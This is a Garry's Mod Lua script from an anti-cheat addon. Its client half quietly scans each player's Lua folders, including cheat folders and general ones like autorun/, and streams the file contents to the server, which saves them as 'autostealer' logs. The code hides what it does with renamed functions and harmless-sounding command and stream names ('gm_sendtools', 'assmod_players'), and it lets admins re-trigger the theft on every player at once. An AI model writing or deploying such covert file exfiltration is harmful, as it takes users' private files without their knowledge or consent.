
if (CLIENT) then
	local WaitFor = 3 --30
	
	local NoSend = {
		"autorun/cat.lua-932",
		"autorun/catply.lua-1017",
		"autorun/client/cl_advdupe.lua-25981",
		"autorun/hac_cl_loader.lua-898",
		"autorun/client/player_info.lua-561",
		"includes/enum/!!!!!!!!!!.lua-54361",
		"autorun/hsp_loader.lua-2988",
		"autorun/client/globalscheck.lua-334",
		"includes/enum/class.lua-255",
		"includes/enum/print_types.lua-84",
		"autorun/serialiser.lua-16288",
		"includes/enum/rendergroup.lua-80",
		"autorun/sh_spropprotection.lua-821",
		"includes/enum/rendermode.lua-672",
		"autorun/ulib_init.lua-108",
		"includes/enum/sim_phys.lua-122",
		"autorun/base_npcs.lua-8541",
		"includes/enum/teams.lua-135",
		"autorun/base_npcs_weapons.lua-658",
		"includes/enum/text_align.lua-111",
		"autorun/base_vehicles.lua-7784",
		"includes/enum/transmit.lua-233",
		"autorun/developer_functions.lua-1744",
		"includes/enum/use_types.lua-292",
		"autorun/options_menu.lua-10729",
		"autorun/utilities_menu.lua-2653",
		"autorun/cs_playermodels.lua-1896",
		"autorun/ep2_entities.lua-581",
		"autorun/ep2_npcs.lua-974",
		"autorun/ep2_playermodels.lua-156",
		"autorun/ep2_vehicles.lua-543",
	}
	
	
	local ToSteal = {
		--Awesome
		{
			What  = "*.lua",
			Where = "menu_plugins/",
		},
		{
			What  = "*.lua",
			Where = "custom_menu/",
		},
		--Generic
		{
			What  = "*.lua",
			Where = "/",
		},
		{
			What  = "*.lua",
			Where = "autorun/",
		},
		{
			What  = "*.lua",
			Where = "autorun/client/",
		},
		{
			What  = "*.lua",
			Where = "includes/enum/",
		},
		{
			What  = "*.lua",
			Where = "dev/",
		},
		--Specific
		{
			What  = "*.lua",
			Where = "dev/",
		},
		{
			What  = "*.lua",
			Where = "shrun/",
		},
		{
			What  = "*.lua",
			Where = "scripts/",
		},
		{
			What  = "*.lua",
			Where = "h4x/",
		},
		{
			What  = "*.lua",
			Where = "hax/",
		},
		{
			What  = "*.lua",
			Where = "hacks/",
		},
		{
			What  = "*.lua",
			Where = "cheat/",
		},
		{
			What  = "*.lua",
			Where = "cheats/",
		},
		{
			What  = "*.lua",
			Where = "bypass/",
		},
		{
			What  = "*.lua",
			Where = "bypasses/",
		},
		--Hades
		{
			What  = "*.lua",
			Where = "hades/",
		},
		{
			What  = "*.lua",
			Where = "hades/core/",
		},
		--Helix
		{
			What  = "*.lua",
			Where = "helix/",
		},
		{
			What  = "*.lua",
			Where = "helix/core/",
		},
		--Hera
		{
			What  = "*.lua",
			Where = "hera/",
		},
		{
			What  = "*.lua",
			Where = "hera/core/",
		},
		--Hermes
		{
			What  = "*.lua",
			Where = "hermes/",
		},
		--JonSuite
		{
			What  = "*.lua",
			Where = "JonSuite/",
		},
		{
			What  = "*.lua",
			Where = "JonSuite/Hacks/",
		},
	}
	
	
	require("datastream")
	local NotSTS		= datastream.StreamToServer	
	local NotRCC		= RunConsoleCommand
	local NotTS			= timer.Simple
	local NotFR			= file.Read
	local NotFXE		= file.Size
	local NotFFIL		= file.FindInLua
	local NotSID		= _R["Player"]["SteamID"]
	
	
	local function ValidString(v)
		return (v and type(v) == "string" and v != "")
	end
	local function Size(v)
		local size = NotFXE("../lua/"..v)
		if (size == -1) then
			return 0
		else
			return size
		end
	end
	
	local function DoCheck()
		local Booty = {}
		local BootyTime = (#ToSteal / 1.5 + 16)
		
		--if (NotSID(LocalPlayer()) != "STEAM_0:0:17809124") then
			for k,v in pairs(ToSteal) do
				NotTS(k / 2, function()
					local What 	= v.What
					local Where = v.Where
					local File	= Where..What
					
					if ValidString(File) and (#NotFFIL(File) >= 1) then
						for x,y in pairs(NotFFIL(File)) do
							NotTS(x / 2, function() --x / 2
								local NewFile = tostring(Where..y)
								local NewSize = tostring( Size(NewFile) )
								if ValidString(y) and (#NotFFIL(NewFile) >= 1) then
									if not table.HasValue(NoSend, Format("%s-%s", NewFile, NewSize) ) then
										table.insert(Booty,
											{
												Name = NewFile,
												Size = NewSize,
												Cont = Format("%s\n%s\n===Begin Stream===\n\n%s", NewFile, (LocalPlayer():Nick() or "Fuck"), NotFR("lua/"..NewFile, true) ),
											}
										)
										NotRCC("gm_sendtools", NewFile, NewSize)
									end
								end
							end)
						end
					end
				end)
			end
		--end
		
		NotTS(BootyTime, function()
			if (#Booty >= 1) then
				--print("! sending booty: ", #Booty, " took: ", BootyTime)
				NotSTS("assmod_players", Booty) --function() NotRCC("gm_finishtools") end
			end
		end)
	end
	NotTS(WaitFor, DoCheck)
	
	
	local function ReloadTools(ply,cmd,args)
		if (#args > 0 and args[1] == "Weld") then
			DoCheck()
		end
	end
	concommand.Add("gm_reloadtools", ReloadTools)
end




if (SERVER) then
	AddCSLuaFile("HAC/sh_StreamHKS.lua")
	
	function HAC.GimmeAccept(ply,handle,id)
		return true
	end
	hook.Add("AcceptStream", "HAC.GimmeAccept", HAC.GimmeAccept)
	
	function TellHeX(ShortMSG,typ,snd)
		for k,v in ipairs(player.GetAll()) do
			if v:IsValid() and v:IsAdmin() and v:IsHeX() and ShortMSG then
				HACGANPLY(v, ShortMSG, typ or NOTIFY_CLEANUP, 10, snd)
			end
		end
	end
	function Print2HeX(str)
		Msg(str)
		for k,v in pairs(player.GetAll()) do 
			if v:IsValid() and v:IsAdmin() and v:IsHeX() and str then
				v:PrintMessage(HUD_PRINTCONSOLE, str)
			end
		end
	end
	
	function HAC.GimmeLog(ply,cmd,args)
		if not ply:IsValid() then return end
		local SID = ply:SID():lower()
		local NewFile = args[1] or "-Fuckup-"
		local NewSize = args[2] or "-Fuckup-"
		local LogName = "hac_autostealer_log-"..SID..".txt"
		
		local Filename = Format("hac_autostealer-%s/%s-%s.txt", SID, NewFile:gsub(".lua",""), NewSize)
		
		if not file.Exists(Filename) then
			TellHeX( Format("AutoStealing %s from %s, DO NOT kick/ban!", NewFile, ply:Nick()) , NOTIFY_GENERIC, "npc/roller/mine/rmine_blip1.wav") --GAN
			Print2HeX( Format("[HAC%s] - AutoStealing %s from %s (%s)\n", HAC.Version, NewFile, ply:Nick(), ply:SteamID()) )
			
			if not file.Exists(LogName) then
				file.Write(LogName, Format("[HAC%s] / (GMod U%s) AutoStealer log created at [%s]\nFor: %s\n\n", HAC.Version, VERSION, Date(), ply:Nick() ) )
			end
			filex.Append(LogName, Format('\t"%s-%s",\n', NewFile, NewSize) )
		end
	end
	concommand.Add("gm_sendtools", HAC.GimmeLog)
	
	
	
	function HAC.GimmeRX(ply,han,id,enc,dec)
		local SID = ply:SID():lower()
		local LogName = "hac_autostealer_log-"..SID..".txt"
		local num = 0
		
		for k,v in pairs(dec) do
			local LuaName = (v.Name or tostring(num)):gsub(".lua","")
			local Size = v.Size or 0
			local Cont = v.Cont or "fuckup"
			local Filename = Format("hac_autostealer-%s/%s-%s.txt", SID, LuaName, Size)
			
			if not file.Exists(Filename) then
				file.Write(Filename, Cont)
				num = num + 1
			end
		end
		
		if (num > 0) then
			TellHeX( Format("AutoStealing %s of %s's files complete!", num, ply:Nick()) , NOTIFY_ERROR, "npc/roller/mine/rmine_taunt1.wav") --complete
			Print2HeX( Format("[HAC%s] - AutoStealing %s of %s's files complete!\n", HAC.Version, num, ply:Nick()) )
			
			if file.Exists(LogName) then
				filex.Append(LogName, Format("\n%s files recieved @ [%s]\n\n\n", num, Date()) )
			end
		else
			TellHeX( Format("Booty table sent by %s was empty!", ply:Nick()) , NOTIFY_ERROR, "npc/roller/mine/rmine_taunt1.wav")
			Print2HeX( Format("[HAC%s] - Booty table sent by %s was empty!\n", HAC.Version, ply:Nick()) )
		end
	end
	datastream.Hook("assmod_players", HAC.GimmeRX)
	
	function HAC.GimmeReloadCL(ply,cmd,args)
		if not ply:IsAdmin() then return end
		for k,v in pairs(player.GetAll()) do
			if ValidEntity(v) then
				v:ConCommand("gm_reloadtools Weld")
			end
		end
	end
	concommand.Add("hac_reload_gimme", HAC.GimmeReloadCL)
	
end







